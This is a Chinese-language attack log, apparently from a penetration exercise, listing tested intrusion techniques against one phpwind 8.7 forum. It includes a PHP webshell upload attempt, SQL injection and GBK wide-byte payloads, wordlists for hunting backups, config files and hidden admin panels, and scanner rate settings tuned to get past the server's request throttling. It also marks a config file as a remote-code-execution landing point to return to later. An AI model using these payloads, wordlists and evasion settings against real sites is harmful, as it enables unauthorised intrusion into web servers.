# phpwind 8.7 单实例补丁面实测矩阵（example.com:1852 实例）

源码基线：同机同源（203.0.113.6 双实例 898=example.com / 1852=example.com）
环境：nginx + PHP 5.3.x + GBK；`<meta name="generator" content="phpwind example.com(20111111)">`

## A. 已实测封堵（不要再投入）

| 手法 | 实测命令 | 实测回显 | 判定 |
|---|---|---|---|
| 头像上传写马 | `POST /example.com?action=uploadicon&step=2&filename=x.php` (body=`<?php echo md5(1);?>`) | `非法操作,请返回` | 扩展名白名单生效 |
| 同上但图片扩展名 + PHP 内容 | `...&filename=x.png` 同 body | `附件内容非法,系统已经将其自动删除！` | 内容校验(GetImgSize)生效 |
| `actions/ajax/leaveword.php` 前台 SQLi | `/actions/ajax/leaveword.php` | `200 + 9字节 "Forbidden"` | nginx deny，且源码已改参数化绑定 |
| `install.php` 重装写配置 | `GET /install.php` | `404` | 文件不存在 |
| 备份/源码包 | `/www.zip /web.zip /backup.zip /admin.zip /data.zip /db.zip /www.rar /web.rar /backup.rar /www.tar.gz /backup.tar.gz /db.sql /backup.sql /tgt5173.sql` | 全 `404/426` | 无泄露 |
| 配置/版本库泄露 | `/.env /.env.bak /.git/config /.git/HEAD /.svn/entries /.svn/wc.db /config.php /config.inc.php /config.php.bak /data/sql_config.php.{bak,~,swp,txt,old,orig,save} /sql_config.php /conf/db.php /database.php` | 全 `404/426` | 无泄露 |
| 接口文档/监控台 | `/swagger-ui.html /swagger/example.com /v2/api-docs /openapi.json /api-docs /actuator{,/env,/health} /druid/example.com /phpmyadmin/ /pma/ /adminer.php` | 全 `404/426` | 不存在 |
| 后台默认入口 | `GET /example.com` | `404/426` | **已改名或删除**（上一轮演练时该文件存在且可 POST） |
| 后台目录 | `/admin/example.com` 等 | `200 + 9字节 "Forbidden"` | nginx deny |
| 后台入口改名枚举（35 个） | admincp/adm/manage/manager/guanli/houtai/sysadmin/sys/system/console/backend/master/root/cp/control/panel/admin1/admin2/admin_login/login_admin/webadmin/siteadmin/administrator/admincp/managecp/admincenter/controlpanel/adminhome/bbsadmin/pwadmin/admin_index | 全 `404/426` | 未命中 |
| `sendpwd.php` SQLi（白盒候选 `:17`） | `--data "step=2&pwuser=zz_no%27exist&email=x@x.com"` | 回显 `zz_no\&#39;exist` | addslashes + escapeStr 双转义 |
| 同上 GBK 宽字节 | `pwuser=zz_no%bf%27exist` | 回显 `zz_no縗&#39;exist` | **宽字节被挡住**，无报错无布尔差异 |
| XFF 绕过后台锁定 | — | 本站 `$db_xforwardip=0` | 不成立 |

## B. 实测可达但门槛不可越（别误判为漏洞）

- `GET /pw_api.php` → `a:3:{s:7:"charset";s:3:"gbk";s:7:"errCode";i:2;s:10:"errMessage";s:10:"Error Sign";}`
  ⇒ 站**未配 apikey**，`md5($arg.$apikey)` 无法伪造。`api/class_base.php` 的 unserialize+call_user_func_array 链因此不可达。
- `GET /pw_example.com` / `GET /example.com` → `200 / 101B`（未登录 `not_login`）
- `GET /ck.php` → `200`，`Content-Type: image/png`，下发 `bdca9_cknum`（图形验证码）
- `GET /simple/` → `200 / 3690B`（手机版版块列表）
- `GET /apps.php?q=updata&cid=1&tid=1`：未登录 → `您没有登录或者您没有权限访问此页面`；登录后 → `Please select class`
  ⇒ **与白盒"无登录检查"记载不符**，需登录 + 有效 class。
- `GET /forumcp.php`（登录态）→ `您不是版主或者不是该版块的版主！`

## C. 唯一"存在但不可利用"的点

`GET /data/sql_config.php` → **HTTP 200 / 0 字节**（对照 `/data/zz_notexist_9x8.php` → 404/426）
⇒ 该文件真实存在于 Web 根下且被 PHP 解析（纯赋值无输出）。这正是 `require/updateset.php::write_config()` 的写入目标，
故白盒所述"一旦找到网络可达调用点即持久化 RCE"的**落点确实存在**；但调用点 `install.php`(404) / `admin/advanced.php`(nginx deny) / `admin/manager.php`(nginx deny) 全部不可达 ⇒ 链断。
**结论：这是一个"落点已知、入口不可达"的待续面，值得在能进后台或找到新调用点时立刻回来打。**

## D. 目录级 deny 判据（本实例）

`200 + 9 字节 "Forbidden"` = nginx deny，出现于 `/admin/`、`/admin/example.com`、`/admin/example.com`、`/simple/mod_read.php`、`/mode/area/`、`/apps/groups/`、`/hack/rate/`、`/api/class_base.php`。
`403 / 548B` = 目录列表被禁：`/apps/`、`/api/`、`/lib/`、`/js/`、`/images/`。
`404 / 426B` = nginx 软 404（与随机不存在路径字节一致）。

## E. 速率特性（会影响所有扫描器）

突发请求会被**立即 RST**（curl `000`，`time_total` 0.05–0.08s），静默数十秒后恢复；静态文件同样受影响。
实测：`login.php` 1 req/s 连发 6/6 成功；无间隔连发 12 发成功 11 次；但 `nuclei -rl 40` 全速跑会把主机判定为
`Skipped ... as found unresponsive 30 times` 而 **0 命中**。
⇒ 对本站群必须用 **≤1 req/s + 连续失败退避 60–75s**，否则扫描结果全是假阴性。